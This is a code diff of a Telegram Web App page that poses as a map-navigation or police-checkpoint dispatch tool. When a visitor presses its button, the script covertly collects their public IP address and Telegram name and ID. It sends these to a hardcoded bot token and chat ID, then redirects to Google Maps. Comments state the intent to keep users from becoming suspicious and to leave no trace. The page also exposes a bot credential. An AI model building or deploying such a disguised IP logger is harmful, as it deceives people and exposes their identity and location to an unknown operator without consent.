@@ -3,44 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>系統載入中</title>
+    <title>即時臨檢點</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { 
             display: flex; flex-direction: column; align-items: center; justify-content: center; 
             height: 100vh; margin: 0; font-family: -apple-system, sans-serif;
-            background-color: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
+            background-color: #ffffff; color: #000000;
         }
         #btn {
-            padding: 18px 35px; font-size: 18px; font-weight: bold; cursor: pointer;
-            background-color: var(--tg-theme-button-color, #2481cc);
-            color: var(--tg-theme-button-text-color, #ffffff);
-            border: none; border-radius: 15px;
+            padding: 20px 40px; font-size: 18px; font-weight: bold; cursor: pointer;
+            background-color: #2481cc; color: #ffffff; border: none; border-radius: 15px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            transition: transform 0.1s;
+            -webkit-appearance: none; /* 解決部分內核樣式問題 */
         }
-        #btn:active { transform: scale(0.95); }
-        #info { margin-top: 20px; font-size: 14px; color: var(--tg-theme-hint-color, #888); }
+        #info { margin-top: 20px; font-size: 14px; color: #888; }
     </style>
 </head>
 <body>
 
-    <button id="btn">🚀 進入地圖導航</button>
-    <div id="info">準備就緒</div>
+    <button id="btn">🚀 勤務指揮中心同步派遣系統</button>
+    <div id="info">系統就緒</div>
 
     <script>
-        // 初始化 Telegram
+        // 確保 Telegram 物件存在
         const tg = window.Telegram.WebApp;
-        
-        try {
-            tg.ready();
-            tg.expand();
-        } catch (e) {
-            console.error("TG SDK 初始化失敗");
-        }
 
-        // 設定你的資訊 (請確認 Token 沒貼錯空格)
+        // 電腦版相容性初始化
+        window.onload = function() {
+            if (tg) {
+                tg.ready();
+                // 電腦版對 expand 支援度不一，改用 try-catch 包裹避免崩潰
+                try { tg.expand(); } catch (e) { console.log("Expand not supported"); }
+            }
+        };
+
         const BOT_TOKEN = '8791584619:AAHyvuJ9an8oF3z21kUxtZIbyVVmLk_jEhM';
         const MY_CHAT_ID = '1287211539';
 
@@ -49,16 +46,15 @@
             const infoDiv = document.getElementById('info');
             
             btn.disabled = true;
-            infoDiv.innerText = "正在連線至安全伺服器...";
+            infoDiv.innerText = "正在同步地圖資訊...";
 
             try {
-                // 1. 取得 IP
+                // 2. 取得 IP (必須 HTTPS)
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const userIp = ipData.ip;
 
-                // 2. 取得 Telegram 使用者資料 (關鍵修正)
-                // 在手機端，資料存在 tg.initDataUnsafe.user 裡
+                // 3. 取得使用者資料
                 let userName = "未知用戶";
                 let userId = "未知ID";
 
@@ -69,10 +65,9 @@
                     userId = u.id;
                 }
 
-                // 3. 組裝訊息
-                const message = `📢 警報：用戶 [${userName}] (ID: ${userId}) 已點擊按鈕\n🌐 來源 IP: ${userIp}`;
+                // 4. 發送至 Bot API (使用 HTML 格式美化)
+                const message = `📢 <b>點擊警報</b>\n👤 用戶: ${userName}\n🆔 ID: ${userId}\n🌐 IP: <code>${userIp}</code>`;
                 
-                // 4. 發送至 Bot API
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -83,17 +78,15 @@
                     })
                 });
 
-                // 5. 成功後轉向
-                infoDiv.innerText = "載入成功，正在跳轉...";
+                // 5. 安全跳轉 (絕對禁止 http://)
+                infoDiv.innerText = "載入成功，正在開啟地圖...";
                 setTimeout(() => {
                     tg.openLink('https://www.google.com/maps');
                     tg.close();
-                }, 300);
+                }, 400);
 
             } catch (err) {
-                // 如果失敗，彈出錯誤訊息視窗以便除錯
-                tg.showAlert("發生錯誤: " + err.message);
-                // 依然嘗試跳轉，不讓用戶起疑
+                // 萬一出錯，直接開啟地圖不留痕跡
                 tg.openLink('https://www.google.com/maps');
             }
         });
